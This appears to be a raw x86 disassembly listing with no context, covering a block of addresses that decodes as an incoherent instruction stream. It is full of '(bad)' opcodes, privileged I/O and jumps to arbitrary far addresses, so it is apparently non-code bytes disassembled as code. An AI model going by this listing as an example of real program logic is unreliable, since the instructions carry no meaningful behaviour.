  42a2b4:	test   DWORD PTR ds:0xdd85f53a,ecx
  42a2ba:	inc    ebp
  42a2bb:	mov    ebp,edi
  42a2bd:	sub    ah,dh
  42a2bf:	xchg   edi,eax
  42a2c0:	and    al,0x15
  42a2c2:	fst    DWORD PTR [edi+0x15d8a124]
  42a2c8:	ss add bh,bh
  42a2cb:	repnz cmp al,0x7d
  42a2ce:	xor    eax,0xfb245650
  42a2d3:	push   edi
  42a2d4:	idiv   edi
  42a2d6:	bswap  edx
  42a2d8:	mov    eax,DWORD PTR [edx+edx*1]
  42a2db:	xchg   esi,eax
  42a2dc:	xchg   DWORD PTR [eax+eax*1],esi
  42a2df:	enter  0x4cdf,0x24
  42a2e3:	pop    ss
  42a2e4:	fwait
  42a2e5:	out    0x8b,al
  42a2e7:	push   edx
  42a2e9:	dec    eax
  42a2ea:	mov    eax,edi
  42a2ec:	repnz and al,0x47
  42a2ef:	or     BYTE PTR [edi],ch
  42a2f1:	xor    edi,ebx
  42a2f3:	xchg   edi,eax
  42a2f4:	pop    es
  42a2f5:	xor    DWORD PTR [edi+ebx*1-0x11],0xffffff81
  42a2fa:	pop    esp
  42a2fb:	outs   dx,DWORD PTR ds:[esi]
  42a2fc:	stc    
  42a2fd:	sub    DWORD PTR [edi+ebx*2-0x73],0x855f4c81
  42a305:	cmp    DWORD PTR [edi+ebx*2-0x1b],0xccfe3b3a
  42a30d:	mov    WORD PTR [eax+0x15],es
  42a310:	sbb    eax,0xf1878bf7
  42a315:	sub    al,0x8b
  42a317:	(bad)  
  42a318:	push   ss
  42a319:	fiadd  DWORD PTR [edx]
  42a31b:	mov    al,bl
  42a31d:	retf   
  42a31e:	add    eax,DWORD PTR [ebx]
  42a320:	dec    edi
  42a321:	push   esi
  42a322:	and    al,0xb7
  42a324:	dec    edi
  42a325:	inc    esi
  42a326:	and    al,0xe7
  42a328:	dec    edi
  42a329:	jbe    0x42a34f
  42a32b:	fndisi(8087 only) 
  42a32d:	pop    esp
  42a32e:	and    al,0x47
  42a330:	int3   
  42a331:	mov    WORD PTR [esi],cs
  42a333:	adc    eax,0x6f8bf71c
  42a338:	icebp  
  42a339:	xor    al,0x8b
  42a33b:	iret   
  42a33c:	repnz cmp BYTE PTR [eax+0x5fc05189],cl
  42a343:	add    BYTE PTR [edx+0x62],ah
  42a346:	pop    ebx
  42a347:	push   edi
  42a348:	loope  0x42a33e
  42a34a:	cmp    BYTE PTR [esi-0x3fcecf8a],bh
  42a350:	dec    ecx
  42a351:	fidivr WORD PTR [edi-0x15]
  42a354:	call   0xbdb7:0xb22458b7
  42a35b:	xchg   BYTE PTR [esi-0x6176a5f4],ch
  42a361:	adc    al,0x26
  42a363:	xchg   DWORD PTR [edx-0x26acabdc],esp
  42a369:	dec    ebx
  42a36a:	and    bl,BYTE PTR [ebx+ebp*8+0x6b]
  42a36e:	and    cl,BYTE PTR [ecx+ebp*8]
  42a371:	jae    0x42a395
  42a373:	pusha  
  42a374:	popa   
  42a375:	repz (bad) 
  42a377:	mov    ebp,0x43c42251
  42a37c:	inc    esi
  42a37d:	daa    
  42a37e:	inc    cl
  42a380:	sahf   
  42a381:	aam    0x6
  42a383:	add    bl,bl
  42a385:	repz sub BYTE PTR [eax-0x25],al
  42a389:	repz sub BYTE PTR [ecx+ebx*4],ah
  42a38d:	sbb    DWORD PTR ds:0xfe2e208d,ecx
  42a393:	(bad)  
  42a394:	fldpi  
  42a396:	sub    BYTE PTR [ebx+ebx*8-0xd],dl
  42a39a:	sub    BYTE PTR [eax],bl
  42a39c:	jmp    0x1196cc8c
  42a3a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a3a2:	pop    ecx
  42a3a3:	and    al,0xa
  42a3a5:	pop    ss
  42a3a6:	int    0x88
  42a3a8:	add    BYTE PTR [esi],bl
  42a3aa:	adc    al,0x2e
  42a3ac:	xchg   DWORD PTR [esi],esp
  42a3ae:	or     al,0x42
  42a3b0:	push   ebp
  42a3b1:	jmp    0x42a39e
  42a3b3:	sub    BYTE PTR [eax],dh
  42a3b5:	fst    DWORD PTR [ebp-0x79]
  42a3b8:	imul   edi,DWORD PTR [esi],0xfffffff0
  42a3bb:	aaa    
  42a3bc:	push   esp
  42a3bd:	inc    esi
  42a3be:	fst    DWORD PTR [ebx]
  42a3c0:	or     eax,0x3e91ae7
  42a3c5:	bound  ecx,QWORD PTR [esi-0x54]
  42a3c8:	daa    
  42a3c9:	ss out dx,al
  42a3cb:	and    eax,0xabbda18a
  42a3d0:	imul   esi,DWORD PTR [edx-0x4d],0x1b9513cd
  42a3d7:	jecxz  0x42a428
  42a3d9:	xor    dh,BYTE PTR [edx-0x5a973412]
  42a3df:	sub    BYTE PTR [ebx+0x69],dl
  42a3e2:	push   eax
  42a3e3:	sub    edx,DWORD PTR [ecx+0x59]
  42a3e6:	push   eax
  42a3e7:	add    eax,0x94188f52
  42a3ec:	daa    
  42a3ed:	inc    esi
  42a3ee:	bound  esi,QWORD PTR [edi+eiz*1+0x27ac647e]
  42a3f5:	sahf   
  42a3f6:	bound  ebx,QWORD PTR [edi+eiz*1+0x27a46246]
  42a3fd:	cmp    ah,BYTE PTR [edx+0x54]
  42a400:	and    BYTE PTR [edx-0x170960ff],cl
  42a406:	sbb    BYTE PTR [edi+0x40],bl
  42a409:	ds mov ebp,0x2100aada
  42a40f:	mov    ebp,0xbd41870f
  42a414:	dec    edi
  42a415:	add    al,0x7d
  42a417:	and    cl,BYTE PTR [ecx]
  42a419:	dec    eax
  42a41a:	jle    0x42a3a1
  42a41c:	pop    esp
  42a41d:	sub    BYTE PTR [eax+0x62],bl
  42a420:	sub    al,0x20
  42a422:	jbe    0x42a3c3
  42a424:	(bad)  
  42a425:	aad    0xda
  42a427:	popf   
  42a428:	retf   
  42a429:	sbb    ebx,ebp
  42a42b:	popf   
  42a42c:	ret    
  42a42d:	push   fs
  42a42f:	sahf   
  42a430:	out    0x3,eax
  42a432:	jmp    0x42a3c1
  42a434:	ret    
  42a435:	inc    edi
  42a436:	mov    al,ds:0x6dcd009d
  42a43b:	fcmovb st,st(2)
  42a43d:	and    eax,0x1fff7d42
  42a442:	sub    bh,BYTE PTR [ebp+0x5e11df3c]
  42a448:	enter  0x63dc,0x60
  42a44c:	sbb    DWORD PTR [eax-0x46],esp
  42a44f:	mov    ebp,0xbdba7268
  42a454:	push   0x5d606e00
  42a459:	or     eax,0xa7fd8eaa
  42a45e:	dec    esp
  42a45f:	jmp    0x9400:0x8555a57d
  42a466:	pusha  
  42a467:	pusha  
  42a468:	adc    DWORD PTR [edi],ebp
  42a46a:	mov    ds:0x5ee964bd,al
  42a46f:	jmp    0x184381e7
  42a474:	pushf  
  42a475:	and    al,0x8d
  42a477:	or     BYTE PTR [esp+0x557dcd1],ah
  42a47e:	push   0x7a
  42a480:	mov    ebp,0x5878e918
  42a485:	out    0xe4,al
  42a487:	and    ebx,DWORD PTR [esp+0x4cd061f5]
  42a48e:	add    eax,0x72028b4a
  42a493:	sbb    eax,0x63d268bd
  42a498:	pusha  
  42a499:	(bad)  
  42a49a:	bound  edx,QWORD PTR ds:0x356968bd
  42a4a0:	mov    ebp,0xdb45e90d
  42a4a5:	xor    eax,0x74b9822d
  42a4aa:	(bad)
  42a4ad:	add    bl,ch
  42a4af:	jmp    0x1042bf97
  42a4b4:	sbb    eax,0x6393e8c1
  42a4b9:	ds push ds
  42a4bb:	jp     0x42a523
  42a4bd:	rol    ecx,0xe3
  42a4c0:	jmp    0x42a449
  42a4c2:	dec    esp
  42a4c3:	addr16 mov ebp,0x6563e9bf
  42a4c9:	ds push ds
  42a4cb:	jns    0x42a530
  42a4cd:	inc    esi
  42a4ce:	push   ds
  42a4cf:	dec    eax
  42a4d0:	sbb    DWORD PTR [esi],edi
  42a4d2:	and    al,0x38
  42a4d4:	fidivr WORD PTR [ecx-0x3a]
  42a4d7:	add    BYTE PTR [edi+0x5b],al
  42a4da:	jbe    0x42a500
  42a4dc:	pop    ss
  42a4dd:	fild   DWORD PTR ds:0xdab285
  42a4e3:	add    bl,cl
  42a4e5:	mov    eax,ds:0x8ebb0800
  42a4ea:	and    al,0x1c
  42a4ec:	cmp    esp,DWORD PTR [ebp+0x45]
  42a4ef:	add    bh,dh
  42a4f1:	into   
  42a4f2:	cmp    BYTE PTR [edi+eiz*1-0x13],0x0
  42a4f7:	je     0x42a4fe
  42a4f9:	fcom   DWORD PTR [esp-0x39]
  42a4fd:	xchg   BYTE PTR [edi],dh
  42a4ff:	or     al,0x7
  42a501:	arpl   WORD PTR [ebp+0x0],ax
  42a504:	jae    0x42a4ef
  42a506:	push   ss
  42a507:	mov    edi,DWORD PTR [ecx-0x7cf71de6]
  42a50d:	cdq    
  42a50e:	push   ss
  42a50f:	add    DWORD PTR [eax+0x1f],eax
  42a512:	shr    eax,0xbb
  42a515:	arpl   WORD PTR [esi+0x24],cx
  42a518:	xlat   BYTE PTR ds:[ebx]
  42a519:	sbb    esp,esp
  42a51b:	sbb    BYTE PTR [ebx-0x67],al
  42a51e:	push   ss
  42a51f:	add    al,BYTE PTR [ebx-0x57]
  42a522:	push   ss
  42a523:	add    eax,DWORD PTR ds:0xba12249a
  42a529:	pop    ebp
  42a52a:	rol    BYTE PTR [edx+eiz*2],0x5b
  42a52e:	or     ecx,DWORD PTR [edx+esi*2]
  42a531:	ds inc ecx
  42a533:	and    al,0x70
  42a535:	add    BYTE PTR [esi+0x70976244],al
  42a53b:	and    al,0x0
  42a53d:	data16 jge 0x42a550
  42a540:	sbb    dl,BYTE PTR [ebx]
  42a542:	xchg   DWORD PTR [eax+0x24],esi
  42a545:	dec    edx
  42a546:	mov    ecx,DWORD PTR [eax+0x24]
  42a549:	inc    edx
  42a54a:	mov    bh,0x70
  42a54c:	and    al,0x32
  42a54e:	scas   eax,DWORD PTR es:[edi]
  42a54f:	jo     0x42a575
  42a551:	call   0x39f:0x55f6a198
  42a558:	lock out 0xbf,eax
  42a55b:	imul   edi,DWORD PTR [esi],0x241a5445
  42a561:	jmp    0x357ebfd9
  42a566:	je     0x42a582
  42a568:	sub    al,0xd9
  42a56a:	imul   ebx,DWORD PTR [edx],0x54
  42a56d:	and    eax,0x24581a74
  42a572:	cmp    eax,0x941500fe
  42a577:	sbb    DWORD PTR [eax-0x27],esp
  42a57a:	arpl   WORD PTR [edx],bx
  42a57c:	and    al,0xaf
  42a57e:	js     0x42a5c0
  42a580:	and    al,0x45
  42a582:	js     0x42a5c4
  42a584:	and    al,0x3c
  42a586:	sub    BYTE PTR [eax],bh
  42a588:	icebp  
  42a589:	in     eax,dx
  42a58a:	lea    edx,ss:[ebx+0x3e]
  42a58e:	in     al,dx
  42a58f:	mov    ebp,0x49d260dd
  42a594:	lea    ebx,[esi-0x2]
  42a597:	dec    ebp
  42a598:	call   0x4740da
  42a59d:	popa   
  42a59e:	push   edx
  42a59f:	lea    ebp,[ebx+0x0]
  42a5a2:	xchg   al,al
  42a5a4:	mov    eax,DWORD PTR [ebx+0x7e]
  42a5a7:	fldcw  WORD PTR [ebx]
  42a5a9:	lea    ebx,[ecx]
  42a5ab:	mov    ebp,0xe89e84d7
  42a5b0:	data16 jmp 0x42a620
  42a5b3:	pusha  
  42a5b4:	cld    
  42a5b5:	pop    ds
  42a5b6:	and    ah,BYTE PTR [eax+0x2c]
  42a5b9:	and    BYTE PTR [esi],ah
  42a5bb:	ror    BYTE PTR [ebx],cl
  42a5bd:	and    BYTE PTR [esi],dh
  42a5bf:	out    0x63,al
  42a5c1:	vmread DWORD PTR ds:0xbd118c6b,edx
  42a5c8:	(bad)  
  42a5c9:	mov    WORD PTR [ecx],fs
  42a5cb:	mov    ebp,0xe8a084af
  42a5d0:	jmp    0x1f9c:0x626d
  42a5d6:	xchg   edx,eax
  42a5d7:	sar    BYTE PTR [edi],1
  42a5d9:	or     dh,bl
  42a5db:	stc    
  42a5dc:	cmp    al,0xf8
  42a5de:	dec    eax
  42a5df:	mov    bh,0x8e
  42a5e1:	pop    eax
  42a5e2:	in     eax,0x1b
  42a5e4:	mov    al,BYTE PTR [ecx+eiz*1+0x620f25a2]
  42a5eb:	stos   BYTE PTR es:[edi],al
  42a5ec:	mov    dh,0x50
  42a5ee:	fst    QWORD PTR [ebp-0x5214ec35]
  42a5f4:	ret    
  42a5f5:	or     ebx,ebp
  42a5f7:	xor    bh,BYTE PTR [edi-0x1512b989]
  42a5fd:	adc    ch,0xd9
  42a600:	out    0x3,eax
  42a602:	xchg   edi,eax
  42a603:	stos   DWORD PTR es:[edi],eax
  42a604:	pop    esi
  42a605:	je     0x42a607
  42a607:	dec    esi
  42a608:	pusha  
  42a609:	sub    al,0x20
  42a60b:	inc    edx
  42a60c:	fcom   st(2)
  42a60e:	xor    esi,edi
  42a610:	pop    esi
  42a611:	test   al,0x70
  42a613:	(bad)  
  42a614:	pusha  
  42a615:	rcl    BYTE PTR [edx-0x19],1
  42a618:	in     eax,dx
  42a619:	adc    DWORD PTR [ebx-0xbbcfe5c],ecx
  42a61f:	enter  0x114,0xe6
  42a623:	paddq  mm7,QWORD PTR [edi]
  42a626:	bound  edx,QWORD PTR [edx]
  42a628:	mov    ebp,0xdf91ea10
  42a62d:	mov    dl,0x2a
  42a62f:	outs   dx,BYTE PTR ds:[esi]
  42a630:	adc    al,0xe2
  42a632:	pusha  
  42a633:	xor    bh,BYTE PTR [ebp-0x79832df0]
  42a639:	(bad)  [edx+0xa]
  42a63c:	mov    ebp,0xbd227218
  42a641:	and    BYTE PTR [edx+0x29],ah
  42a644:	icebp  
  42a645:	mov    edx,ebp
  42a647:	ja     0x42a6a7
  42a649:	ds test al,0x60
  42a64c:	and    BYTE PTR ds:0x3ce8f5e8,bh
  42a652:	jmp    0x42a621
  42a654:	icebp  
  42a655:	cmp    al,0xe5
  42a657:	sar    BYTE PTR [ebp-0x2624181b],cl
  42a65d:	mov    al,ch
  42a65f:	sahf   
  42a660:	xchg   edi,eax
  42a661:	xor    eax,0xe607b03b
  42a666:	xlat   BYTE PTR ds:[ebx]
  42a667:	jmp    0x42a642
  42a669:	mov    al,ch
  42a66b:	add    BYTE PTR [esi-0x4fe4ca69],ah
  42a671:	pop    es
  42a672:	out    0xe3,al
  42a674:	jmp    0x42a64f
  42a676:	mov    al,ch
  42a678:	sahf   
  42a679:	xchg   edi,eax
  42a67a:	xor    eax,0xfe0793fb
  42a67f:	sbb    DWORD PTR [ebp+0x5c],0x6251cd55
  42a686:	jge    0x42a64d
  42a688:	pop    ecx
  42a689:	int3   
  42a68a:	jl     0x42a699
  42a68c:	dec    edx
  42a68d:	loopne 0x42a611
  42a68f:	push   ebp
  42a690:	in     eax,dx
  42a691:	push   cs
  42a692:	cli    
  42a693:	aaa    
  42a694:	cmp    edi,DWORD PTR [edx]
  42a696:	sub    eax,0x59d9223d
  42a69b:	add    BYTE PTR [eax-0x44f3454a],al
  42a6a1:	push   esi
  42a6a2:	out    0x50,al
  42a6a4:	inc    edx
  42a6a5:	pushf  
  42a6a6:	and    al,0x4c
  42a6a8:	inc    eax
  42a6a9:	pushf  
  42a6aa:	and    al,0x54
  42a6ac:	ins    DWORD PTR es:[edi],dx
  42a6ad:	fsubr  QWORD PTR [ebp-0x13a141bf]
  42a6b3:	pushw  cs
  42a6b5:	sbb    BYTE PTR [edi],al
  42a6b7:	test   BYTE PTR [edx-0x6b0005ed],bh
  42a6bd:	inc    edx
  42a6be:	push   ecx
  42a6bf:	pop    es
  42a6c0:	pop    ebp
  42a6c1:	pop    edx
  42a6c2:	int3   
  42a6c3:	(bad)  
  42a6c4:	pmuludq mm0,QWORD PTR [eax+eax*1]
  42a6c8:	mov    ebx,edx
  42a6ca:	lods   eax,DWORD PTR ds:[esi]
  42a6cb:	dec    ecx
  42a6cc:	jp     0x42a6a4
  42a6ce:	mov    edi,0x17cc000f
  42a6d3:	mov    DWORD PTR [edi+ebp*2-0x2b],eax
  42a6d7:	add    DWORD PTR [edi+ebx*2-0x4b],0x96d06649
  42a6df:	stc    
  42a6e0:	cmp    BYTE PTR gs:[ecx],bl
  42a6e3:	pop    es
  42a6e4:	mov    bh,0x8b
  42a6e6:	gs ds and al,0x3b
  42a6ea:	pusha  
  42a6eb:	ds and al,0x47
  42a6ee:	pusha  
  42a6ef:	shr    DWORD PTR [ebx],1
  42a6f1:	jns    0x42a6ce
  42a6f3:	lods   eax,DWORD PTR ds:[esi]
  42a6f4:	enter  0xa3de,0x29
  42a6f8:	in     eax,dx
  42a6f9:	cmp    al,0xd2
  42a6fb:	and    al,0x3c
  42a6fd:	fcmovnbe st,st(6)
  42a6ff:	add    BYTE PTR [eax],al
  42a701:	fst    st(5)
  42a703:	dec    esp
  42a704:	and    al,0xb7
  42a706:	pop    edi
  42a707:	shr    DWORD PTR [edx-0x15],0xb5
  42a70b:	add    eax,0xaddcba42
  42a710:	enter  0x9970,0x24
  42a714:	inc    esp
  42a715:	(bad)  
  42a716:	sti    
  42a717:	lods   al,BYTE PTR ds:[esi]
  42a718:	mov    edi,0x5020bceb
  42a71d:	pop    ebp
  42a71e:	xchg   ebx,eax
  42a71f:	mov    esi,0xd187c786
  42a724:	mov    BYTE PTR [esi],bh
  42a726:	in     al,0x2c
  42a728:	mov    DWORD PTR [esi-0x24],eax
  42a72b:	and    BYTE PTR [ecx-0x76f1dbf2],cl
  42a731:	push   cs
  42a732:	sbb    al,0x3e
  42a734:	mov    DWORD PTR [eax],eax
  42a736:	cs and al,0x46
  42a739:	mov    DWORD PTR [esi],ebx
  42a73b:	sbb    al,0x1e
  42a73d:	aaa    
  42a73e:	es and al,0x4e
  42a741:	or     edx,edi
  42a743:	js     0x42a744
  42a745:	jmp    DWORD PTR [edx-0x1e]
  42a748:	jns    0x42a712
  42a74a:	gs jl  0x42a794
  42a74d:	add    DWORD PTR [edx+0x0],esp
  42a750:	add    eax,0x87f01cb2
  42a755:	push   ebx
  42a756:	xchg   BYTE PTR [eax*1-0x52ccd44d],ah
  42a75d:	jne    0x42a7c0
  42a75f:	or     esp,DWORD PTR [ebp+0x1a3bdbc0]
  42a765:	sub    al,0xe9
  42a767:	inc    ebx
  42a768:	sbb    bh,BYTE PTR [eax]
  42a76a:	mov    DWORD PTR [ebx+0x6222b303],edi
  42a770:	aaa    
  42a771:	inc    esp
  42a772:	jle    0x42a7a8
  42a774:	xchg   DWORD PTR [ebx+0x46],ecx
  42a777:	xor    BYTE PTR [ecx+0x566088c7],cl
  42a77d:	or     esp,DWORD PTR [eax+0x3e4387c8]
  42a783:	sbb    BYTE PTR ds:0x407922b3,al
  42a789:	and    al,0xa6
  42a78b:	fldcw  WORD PTR [ebx-0x18271201]
  42a791:	pop    ebp
  42a792:	fistp  WORD PTR [edi]
  42a794:	jmp    0x42a815
  42a796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a797:	fsub   st,st(7)
  42a799:	add    eax,DWORD PTR [eax]
  42a79b:	fld    QWORD PTR [ebx+eax*1+0xbb4e51c]
  42a7a2:	sbb    BYTE PTR [ecx+0x4a],bl
  42a7a5:	cmp    cl,BYTE PTR [esp+eiz*8]
  42a7a8:	mov    ds:0x2bf104f7,al
  42a7ad:	pop    ds
  42a7ae:	add    DWORD PTR [ebp+ebx*2-0x1dc1dfc4],edx
  42a7b5:	dec    edx
  42a7b6:	aam    0x68
  42a7b8:	inc    edx
  42a7b9:	adc    al,0x20
  42a7bb:	jbe    0x42a793
  42a7bd:	sub    esp,DWORD PTR [eax]
  42a7bf:	inc    edx
  42a7c0:	(bad)  
  42a7c1:	add    esp,DWORD PTR [eax]
  42a7c3:	inc    edx
  42a7c4:	loop   0x42a7f7
  42a7c6:	ret    0x4268
  42a7c9:	nop
  42a7ca:	add    al,0xc9
  42a7cc:	adc    BYTE PTR [eax+0x39],ch
  42a7cf:	bound  edi,QWORD PTR [edi-0x19]
  42a7d2:	push   esi
  42a7d3:	pop    ecx
  42a7d4:	pop    ebp
  42a7d5:	sub    DWORD PTR [edx],eax
  42a7d7:	(bad)  
  42a7d8:	fldenv [edi-0x6]
  42a7db:	(bad)  
  42a7dc:	loopne 0x42a842
  42a7de:	adc    esp,DWORD PTR [ebx-0x27]
  42a7e1:	out    0x88,eax
  42a7e3:	xor    ch,dl
  42a7e5:	ds ins BYTE PTR es:[edi],dx
  42a7e7:	jns    0x42a84d
  42a7e9:	stos   BYTE PTR es:[edi],al
  42a7ea:	sbb    esp,edi
  42a7ec:	fst    st(7)
  42a7ee:	mov    BYTE PTR [ecx+0x2300d3b5],ah
  42a7f4:	arpl   WORD PTR [edi+ebx*1+0x701fd4b6],sp
  42a7fb:	inc    ebx
  42a7fc:	mov    fs:0x1a45000f,al
  42a802:	out    0xc1,eax
  42a804:	ficom  DWORD PTR [ebp-0x2a1ba43d]
  42a80a:	add    cl,ah
  42a80c:	cmp    ebx,edx
  42a80e:	or     DWORD PTR [ecx+ebx*8-0x27],esp
  42a812:	add    cl,ch
  42a814:	fs pushf 
  42a816:	and    al,0x41
  42a818:	daa    
  42a819:	enter  0xd4c,0x3a
  42a81d:	jg     0x42a805
  42a81f:	jmp    0xc856:0x2f85dd2b
  42a826:	int    0x37
  42a828:	stos   BYTE PTR es:[edi],al
  42a829:	push   edi
  42a82a:	pop    ebp
  42a82b:	or     eax,0x57d584e
  42a830:	push   0x10
  42a832:	jbe    0x42a801
  42a834:	pop    ecx
  42a835:	pop    eax
  42a836:	inc    ebp
  42a837:	lds    ecx,FWORD PTR [ecx-0x48]
  42a83a:	shl    esi,0xd8
  42a83d:	push   eax
  42a83e:	arpl   ax,dx
  42a840:	and    eax,0xc6723cb5
  42a845:	jbe    0x42a8a7
  42a847:	and    DWORD PTR [ecx-0x31],esp
  42a84a:	enter  0xb8e6,0x1b
  42a84e:	or     dh,BYTE PTR [esi]
  42a850:	scas   eax,DWORD PTR es:[edi]
  42a851:	popa   
  42a852:	inc    ebp
  42a853:	or     eax,0x54d6252
  42a858:	outs   dx,BYTE PTR ds:[esi]
  42a859:	bound  edi,QWORD PTR [ebp+0xd]
  42a85c:	call   0x8ce4:0xa20544c8
  42a863:	adc    al,0x0
  42a865:	push   ecx
  42a866:	adc    edi,edx
  42a868:	jb     0x42a804
  42a86a:	mov    ch,0x40
  42a86c:	jmp    0xb59a:0x6248b58d
  42a873:	inc    esp
  42a874:	rcr    BYTE PTR [edi],cl
  42a876:	jecxz  0x42a829
  42a878:	sub    DWORD PTR [ecx+edi*2+0x11448f59],edi
  42a87f:	xchg   BYTE PTR [ecx],ah
  42a881:	popa   
  42a882:	iret   
  42a883:	leave  
  42a884:	add    BYTE PTR [ebx+edx*2],cl
  42a887:	mov    esp,0x894e340f
  42a88c:	push   esp
  42a88d:	daa    
  42a88e:	pushf  
  42a88f:	xchg   DWORD PTR [edi+eiz*1-0x2c],ecx
  42a893:	xchg   DWORD PTR [edi+edx*2-0x4b],eax
  42a897:	xor    DWORD PTR [edi+eiz*2-0x5b],eax
  42a89b:	add    eax,0xf709df8c
  42a8a0:	inc    DWORD PTR [esi+0x1f]
  42a8a3:	pop    es
  42a8a4:	test   BYTE PTR [ebx-0x29],ah
  42a8a7:	add    BYTE PTR [eax],al
  42a8a9:	and    eax,0x4008bb16
  42a8ae:	mov    BYTE PTR [esp+ebx*2],ah
  42a8b1:	test   al,0x1b
  42a8b3:	push   ebp
  42a8b4:	data16 xor bl,BYTE PTR [eax-0x1e8e97dc]
  42a8bb:	mov    eax,DWORD PTR [edi+eiz*4-0x51]
  42a8bf:	push   eax
  42a8c0:	push   esi
  42a8c1:	mov    ss,WORD PTR gs:[ebp+0x24]
  42a8c5:	test   DWORD PTR [edx],ecx
  42a8c7:	adc    eax,0x9b950038
  42a8cc:	add    BYTE PTR [ebx-0x7cd74891],cl
  42a8d2:	repz xlat BYTE PTR ds:[ebx]
  42a8d4:	add    eax,0xd56c85
  42a8d9:	add    BYTE PTR [esi+eax*4+0x33c02424],bh
  42a8e0:	or     esi,0xffffffa3
  42a8e3:	cmp    BYTE PTR [esi],al
  42a8e5:	call   FWORD PTR [esi+edx*2-0x338f046]
  42a8ec:	add    BYTE PTR [eax],al
  42a8ee:	dec    ebx
  42a8ef:	enter  0x45eb,0xa2
  42a8f3:	add    al,0x1
  42a8f5:	add    BYTE PTR [ebx],bh
  42a8f7:	pop    ebx
  42a8f8:	stc    
  42a8f9:	add    dh,dh
  42a8fb:	cwde   
  42a8fc:	adc    edi,0xaeb2b62
  42a902:	in     eax,0x16
  42a904:	out    dx,eax
  42a905:	cli    
  42a906:	add    eax,0xef18478c
  42a90b:	cld    
  42a90c:	or     eax,0x1a1c9e87
  42a911:	jmp    DWORD PTR [edx]
  42a913:	jp     0x42a956
  42a915:	and    al,0x8a
  42a917:	mov    ebx,0x8b836ebc
  42a91c:	inc    esi
  42a91d:	adc    al,0x89
  42a91f:	inc    ecx
  42a920:	add    al,0xbe
  42a922:	(bad)  [eax+ebp*1+0x88b3c54]
  42a929:	or     BYTE PTR [ebx+ebx*8-0x3],al
  42a92d:	je     0x42a92f
  42a92f:	xor    edi,DWORD PTR [ebx+0x48]
  42a932:	and    al,0x16
  42a934:	cmp    DWORD PTR [ebp+0x28c468fd],0x58
  42a93b:	adc    BYTE PTR [edx+0x4],ch
  42a93e:	push   edx
  42a93f:	data16 jnp 0x42a988
  42a942:	sbb    BYTE PTR [ecx+0x53],cl
  42a945:	ja     0x42a90b
  42a947:	jnp    0x42a9ab
  42a949:	out    dx,eax
  42a94a:	cli    
  42a94b:	jge    0x42a8cd
  42a94d:	in     eax,0x3
  42a94f:	gs jge 0x42a917
  42a952:	stc    
  42a953:	ins    DWORD PTR es:[edi],dx
  42a954:	jg     0x42a9d1
  42a956:	shr    BYTE PTR [ecx],cl
  42a958:	jnp    0x42a959
  42a95a:	sub    BYTE PTR ds:0xe9faefae,0x3d
  42a961:	push   es
  42a962:	lea    ebx,[esi+0x10]
  42a965:	jge    0x42a9aa
  42a967:	jle    0x42a94d
  42a969:	add    eax,ecx
  42a96b:	jmp    0x42a9a0
  42a96d:	and    bl,BYTE PTR [eax+0x79]
  42a970:	mov    eax,0x35d91b73
  42a975:	adc    ah,BYTE PTR [edi]
  42a977:	and    ebx,ecx
  42a979:	out    0xc5,al
  42a97b:	jmp    0xdfd4:0xdd57c394
  42a982:	sub    al,0x63
  42a984:	test   bl,ch
  42a986:	jl     0x42a929
  42a988:	mov    ch,0x9b
  42a98a:	test   BYTE PTR [edx],ah
  42a98c:	aad    0xbe
  42a98e:	aas    
  42a98f:	ds mov cl,0x75
  42a992:	fild   WORD PTR [eax]
  42a994:	in     al,dx
  42a995:	mov    ds:0xf1a37cdb,eax
  42a99a:	push   ds
  42a99b:	aad    0x53
  42a99d:	pop    ss
  42a99e:	sar    DWORD PTR [esi-0x25],1
  42a9a1:	or     eax,0x971000d3
  42a9a6:	sub    BYTE PTR [ebp+0x19],bh
  42a9a9:	mov    ch,0xdb
  42a9ab:	pop    edx
  42a9ac:	mov    ds:0x620403d8,al
  42a9b1:	pop    edx
  42a9b2:	xor    al,BYTE PTR [eax+0x67]
  42a9b5:	test   edx,esp
  42a9b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a9b8:	jns    0x42aa37
  42a9ba:	sub    eax,DWORD PTR [eax*4+0x52c266d9]
  42a9c1:	bound  edi,QWORD PTR [eax+ebp*1]
  42a9c4:	inc    esi
  42a9c5:	ficomp DWORD PTR [edi+0x70dcc784]
  42a9cb:	aas    
  42a9cc:	inc    esi
  42a9cd:	in     eax,0xe6
  42a9cf:	shl    dh,cl
  42a9d1:	pushf  
  42a9d2:	retf   
  42a9d3:	sbb    edi,DWORD PTR [edx-0x59]
  42a9d6:	icebp  
  42a9d7:	add    esp,DWORD PTR [edx+0x55]
  42a9da:	sub    BYTE PTR [eax],al
  42a9dc:	out    0x9c,al
  42a9de:	pop    ecx
  42a9df:	lock pop eax
  42a9e1:	popa   
  42a9e2:	mov    esp,0xbc607a27
  42a9e7:	daa    
  42a9e8:	jle    0x42aa5d
  42a9ea:	outs   dx,BYTE PTR ds:[esi]
  42a9eb:	inc    edi
  42a9ec:	xchg   BYTE PTR [ecx-0x1e0a3d3f],bl
  42a9f2:	add    bh,cl
  42a9f4:	test   al,0xd8
  42a9f6:	mov    DWORD PTR es:[eax],0xdd2498a6
  42a9fd:	mov    ebx,DWORD PTR [edx]
  42a9ff:	shl    ecx,0x8b
  42aa02:	bound  eax,QWORD PTR [ebp-0x3d]
  42aa05:	addr16 ja 0x42a98d
  42aa08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aa09:	cmp    eax,0x212862a1
  42aa0e:	aad    0x62
  42aa10:	jo     0x42a9af
  42aa12:	mov    bl,0x4
  42aa14:	(bad)  
  42aa15:	outs   dx,BYTE PTR ds:[esi]
  42aa16:	cwde   
  42aa17:	and    al,0xd1
  42aa19:	jnp    0x42aa35
  42aa1b:	shl    ecx,0x47
  42aa1e:	bound  eax,QWORD PTR [ebp+0x13]
  42aa21:	pop    esp
  42aa22:	push   esp
  42aa23:	inc    ebx
  42aa24:	cmp    ebx,esp
  42aa26:	xchg   esi,eax
  42aa27:	or     al,0xea
  42aa29:	test   DWORD PTR [ebp-0x4cd58fdc],esi
  42aa2f:	or     BYTE PTR [edx+0x44],ch
  42aa32:	popf   
  42aa33:	add    eax,DWORD PTR [ebx+0x66]
  42aa36:	scas   al,BYTE PTR es:[edi]
  42aa37:	je     0x42aa11
  42aa39:	mov    ah,0x88
  42aa3b:	and    al,0xd5
  42aa3d:	sbb    BYTE PTR [ecx],ch
  42aa3f:	dec    esi
  42aa40:	sbb    DWORD PTR ss:[edx],esp
  42aa43:	jmp    0xfa5223a6
